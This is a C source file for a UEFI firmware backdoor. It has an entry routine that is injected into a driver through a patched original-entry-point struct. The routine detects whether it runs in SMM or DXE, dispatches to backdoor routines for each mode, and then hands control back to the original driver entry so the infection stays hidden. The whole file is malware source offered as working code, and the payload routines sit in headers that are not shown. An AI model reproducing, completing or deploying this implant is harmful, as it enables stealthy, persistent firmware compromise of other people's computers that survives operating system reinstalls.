#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>

#include "Protocol/SmmBase.h"
#include "globals.h"
#include "efivars.h"
#include "locate.h"
#include "common_string.h"

#include "smm.h"
#include "dxe.h"

EFI_STATUS EFIAPI __attribute__((noinline)) BackdoorEntryMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable);

volatile struct OEP_t OEP = {
    .oep = 0x1234567890abcdef,
    .ep = (UINT64) &BackdoorEntryMain
};


EFI_STATUS EFIAPI __attribute__((noinline)) BackdoorEntryMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {

    Init(ImageHandle, SystemTable);

    EFI_STATUS EFIAPI (*Oep)(EFI_HANDLE, EFI_SYSTEM_TABLE *) = 
        ( EFI_STATUS EFIAPI (*)(EFI_HANDLE, EFI_SYSTEM_TABLE *) )
            (((UINT64) gLoadedImage->ImageBase) + OEP.oep);

    EFI_SMM_BASE_PROTOCOL* smm_base = NULL;
    EFI_STATUS status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, (void **) &smm_base);

    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Failed to fetch EFI_SMM_BASE_PROTOCOL");
        return Oep(ImageHandle, SystemTable);
    }

    BOOLEAN in_smm = FALSE;
    smm_base->InSmm(smm_base, &in_smm);

    if (in_smm) 
        backdoor_smm_entry(smm_base);
    else
        backdoor_dxe_entry();

    return Oep(ImageHandle, SystemTable);
}

EFI_STATUS EFIAPI BackdoorMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    return BackdoorEntryMain(ImageHandle, SystemTable);
}


